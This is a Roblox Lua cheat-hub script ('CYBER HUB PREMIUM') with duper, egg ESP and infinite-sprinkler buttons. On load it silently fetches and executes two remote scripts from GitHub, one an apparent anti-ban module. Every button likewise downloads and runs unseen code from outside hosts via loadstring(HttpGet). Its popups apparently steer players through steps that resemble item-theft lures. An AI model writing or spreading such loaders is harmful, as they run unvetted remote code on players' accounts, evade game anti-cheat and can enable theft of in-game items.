local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Create main GUI container
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CyberHubPremium"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- ===== AUTO-EXECUTE 1 =====
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/main/5631075000133c7fa307da94f3bc5b7c.txt", true))()
    end)
end)

-- ===== AUTO-EXECUTE 2 =====
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/ANTIban.lua", true))()
    end)
end)

-- ===== MAIN CONTROL PANEL =====
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0.45,0,0.55,0)
MainFrame.Position = UDim2.new(0.275,0,0.225,0)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
MainFrame.BackgroundTransparency = 0.1
MainFrame.Parent = ScreenGui

-- Cyber grid background
local Grid = Instance.new("ImageLabel")
Grid.Size = UDim2.new(1, 0, 1, 0)
Grid.Image = "rbxassetid://9091674221"
Grid.ImageTransparency = 0.95
Grid.ScaleType = Enum.ScaleType.Tile
Grid.TileSize = UDim2.new(0, 80, 0, 80)
Grid.BackgroundTransparency = 1
Grid.Parent = MainFrame

-- Glowing border
local Border = Instance.new("Frame")
Border.Size = UDim2.new(1, 4, 1, 4)
Border.Position = UDim2.new(0, -2, 0, -2)
Border.BackgroundColor3 = Color3.new(0, 0.7, 0.2)
Border.ZIndex = -1
Border.Parent = MainFrame

-- Animated glow effect
local GlowEffect = Instance.new("ImageLabel")
GlowEffect.Size = UDim2.new(1, 10, 1, 10)
GlowEffect.Position = UDim2.new(0, -5, 0, -5)
GlowEffect.Image = "rbxassetid://5028857084"
GlowEffect.ImageColor3 = Color3.new(0, 0.5, 0.1)
GlowEffect.ScaleType = Enum.ScaleType.Slice
GlowEffect.SliceCenter = Rect.new(100, 100, 100, 100)
GlowEffect.BackgroundTransparency = 1
GlowEffect.ZIndex = -1
GlowEffect.Parent = Border

-- Pulsing glow animation
task.spawn(function()
    while GlowEffect.Parent do
        TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
            ImageTransparency = 0.3
        }):Play()
        task.wait(1.5)
        TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
            ImageTransparency = 0.7
        }):Play()
        task.wait(1.5)
    end
end)

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0.1, 0)
Header.BackgroundColor3 = Color3.new(0, 0.15, 0.05)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -20, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "CYBER HUB PREMIUM"
Title.TextColor3 = Color3.new(0, 1, 0.5)
Title.Font = Enum.Font.Code
Title.TextSize = 18
Title.TextStrokeTransparency = 0.5
Title.TextStrokeColor3 = Color3.new(0, 0.2, 0.1)
Title.BackgroundTransparency = 1
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

-- ===== MINIMIZE BUTTON =====
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0.08,0,0.08,0)
MinimizeButton.Position = UDim2.new(0.82,0,0.02,0)
MinimizeButton.Text = "_"
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255,193,7)
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.TextColor3 = Color3.new(1,1,1)
MinimizeButton.TextSize = 16
MinimizeButton.Parent = MainFrame

-- ===== RESTORE BUTTON =====
local RestoreButton = Instance.new("TextButton")
RestoreButton.Size = UDim2.new(0.12,0,0.08,0)
RestoreButton.Position = UDim2.new(0.01,0,0.01,0)
RestoreButton.Text = "≡"
RestoreButton.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
RestoreButton.Font = Enum.Font.GothamBold
RestoreButton.TextColor3 = Color3.new(1,1,1)
RestoreButton.TextSize = 20
RestoreButton.Visible = false
RestoreButton.Parent = ScreenGui

-- Minimize/Restore functionality
MinimizeButton.MouseButton1Click:Connect(function()
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0,0,0,0)}):Play()
    task.wait(0.3)
    MainFrame.Visible = false
    RestoreButton.Visible = true
end)

RestoreButton.MouseButton1Click:Connect(function()
    RestoreButton.Visible = false
    MainFrame.Visible = true
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0.45,0,0.55,0)}):Play()
end)

-- ===== BUTTON CONTAINER =====
local ButtonContainer = Instance.new("Frame")
ButtonContainer.Size = UDim2.new(0.92,0,0.82,0)
ButtonContainer.Position = UDim2.new(0.04,0,0.15,0)
ButtonContainer.BackgroundTransparency = 1
ButtonContainer.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0.03,0)
UIListLayout.Parent = ButtonContainer

-- ===== POPUP SYSTEM =====
local function CreatePopup(title, message, accentColor)
    local PopupFrame = Instance.new("Frame")
    PopupFrame.Size = UDim2.new(0.6, 0, 0.3, 0)
    PopupFrame.Position = UDim2.new(0.2, 0, 0.35, 0)
    PopupFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
    PopupFrame.BackgroundTransparency = 0.1
    PopupFrame.Parent = ScreenGui
    
    -- Glowing border
    local PopupBorder = Instance.new("Frame")
    PopupBorder.Size = UDim2.new(1, 4, 1, 4)
    PopupBorder.Position = UDim2.new(0, -2, 0, -2)
    PopupBorder.BackgroundColor3 = accentColor
    PopupBorder.ZIndex = -1
    PopupBorder.Parent = PopupFrame
    
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0.2, 0)
    Header.BackgroundColor3 = accentColor
    Header.Parent = PopupFrame
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
    TitleLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
    TitleLabel.Text = title
    TitleLabel.Font = Enum.Font.Code
    TitleLabel.TextColor3 = Color3.new(1,1,1)
    TitleLabel.TextSize = 18
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Parent = Header
    
    local MessageLabel = Instance.new("TextLabel")
    MessageLabel.Size = UDim2.new(0.9, 0, 0.6, 0)
    MessageLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
    MessageLabel.Text = message
    MessageLabel.Font = Enum.Font.Code
    MessageLabel.TextColor3 = Color3.new(0.9,0.9,0.9)
    MessageLabel.TextSize = 14
    MessageLabel.TextWrapped = true
    MessageLabel.BackgroundTransparency = 1
    MessageLabel.Parent = PopupFrame
    
    local OKButton = Instance.new("TextButton")
    OKButton.Size = UDim2.new(0.3, 0, 0.15, 0)
    OKButton.Position = UDim2.new(0.35, 0, 0.8, 0)
    OKButton.BackgroundColor3 = accentColor
    OKButton.Text = "ACKNOWLEDGE"
    OKButton.Font = Enum.Font.Code
    OKButton.TextColor3 = Color3.new(1,1,1)
    OKButton.TextSize = 14
    OKButton.Parent = PopupFrame
    
    OKButton.MouseButton1Click:Connect(function()
        TweenService:Create(PopupFrame, TweenInfo.new(0.3), {
            Size = UDim2.new(0,0,0,0),
            Position = UDim2.new(0.5,0,0.5,0)
        }):Play()
        task.wait(0.3)
        PopupFrame:Destroy()
    end)
    
    PopupFrame.Size = UDim2.new(0,0,0,0)
    TweenService:Create(PopupFrame, TweenInfo.new(0.3), {Size = UDim2.new(0.6,0,0.3,0)}):Play()
end

-- ===== BUTTON 1: SERVER SCANNER =====
local ServerScannerButton = Instance.new("TextButton")
ServerScannerButton.Size = UDim2.new(1,0,0.18,0)
ServerScannerButton.Text = "SERVER SCANNER"
ServerScannerButton.BackgroundColor3 = Color3.fromRGB(255, 152, 0)
ServerScannerButton.Font = Enum.Font.Code
ServerScannerButton.TextColor3 = Color3.new(1,1,1)
ServerScannerButton.TextSize = 14
ServerScannerButton.TextWrapped = true
ServerScannerButton.Parent = ButtonContainer

ServerScannerButton.MouseButton1Click:Connect(function()
    CreatePopup("SYSTEM NOTICE", "Run the Server Scanner first, then check server compatibility", Color3.fromRGB(255, 152, 0))
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250621_fb7786.lua", true))()
        end)
    end)
end)

-- ===== BUTTON 2: DUPER (UPDATED) =====
local DuperButton = Instance.new("TextButton")
DuperButton.Size = UDim2.new(1,0,0.18,0)
DuperButton.Text = "DUPER"
DuperButton.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
DuperButton.Font = Enum.Font.Code
DuperButton.TextColor3 = Color3.new(1,1,1)
DuperButton.TextSize = 14
DuperButton.TextWrapped = true
DuperButton.Parent = ButtonContainer

DuperButton.MouseButton1Click:Connect(function()
    CreatePopup("SYSTEM STATUS", "Duper module activated", Color3.fromRGB(76, 175, 80))
    task.spawn(function()
        pcall(function()
            -- Updated as requested
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250622_d4f90d.lua", true))()
        end)
    end)
end)

-- ===== BUTTON 3: EGG ESP =====
local EggESPButton = Instance.new("TextButton")
EggESPButton.Size = UDim2.new(1,0,0.18,0)
EggESPButton.Text = "EGG ESP"
EggESPButton.BackgroundColor3 = Color3.fromRGB(156, 39, 176)
EggESPButton.Font = Enum.Font.Code
EggESPButton.TextColor3 = Color3.new(1,1,1)
EggESPButton.TextSize = 14
EggESPButton.TextWrapped = true
EggESPButton.Parent = ButtonContainer

EggESPButton.MouseButton1Click:Connect(function()
    CreatePopup("SECURITY ALERT", "⚠️ YOUR EGG MUST BE READY TO HATCH ⚠️\nServer hops will find v1346 below", Color3.fromRGB(244, 67, 54))
    task.spawn(function()
        task.wait(2)
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/main/Loader/LoaderV1.lua", true))()
        end)
    end)
end)

-- ===== BUTTON 4: INFINITE SPRINKLER =====
local SprinklerButton = Instance.new("TextButton")
SprinklerButton.Size = UDim2.new(1,0,0.18,0)
SprinklerButton.Text = "INF SPRINKLER"
SprinklerButton.BackgroundColor3 = Color3.fromRGB(33, 150, 243)
SprinklerButton.Font = Enum.Font.Code
SprinklerButton.TextColor3 = Color3.new(1,1,1)
SprinklerButton.TextSize = 14
SprinklerButton.TextWrapped = true
SprinklerButton.Parent = ButtonContainer

SprinklerButton.MouseButton1Click:Connect(function()
    CreatePopup("SYSTEM REQUIREMENT", "You need 5-10 Sprinklers of selected type", Color3.fromRGB(33, 150, 243))
    task.spawn(function()
        task.wait(2)
        pcall(function()
            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1c1979f776d3e81869cf5f49f91900a7.lua", true))()
        end)
    end)
end)

-- ===== CLOSE BUTTON =====
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0.08,0,0.08,0)
CloseButton.Position = UDim2.new(0.9,0,0.02,0)
CloseButton.Text = "X"
CloseButton.BackgroundColor3 = Color3.fromRGB(244, 67, 54)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextColor3 = Color3.new(1,1,1)
CloseButton.TextSize = 16
CloseButton.Parent = MainFrame

CloseButton.MouseButton1Click:Connect(function() 
    MainFrame.Visible = false 
    RestoreButton.Visible = true
end)

-- ===== ANIMATE IN =====
MainFrame.Size = UDim2.new(0,0,0,0)
TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
    Size = UDim2.new(0.45,0,0.55,0)
}):Play()

-- ===== AMBIENT MUSIC =====
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://142376088"
sound.Looped = true
sound.Volume = 0.5
sound.Parent = player.PlayerGui
sound:Play()
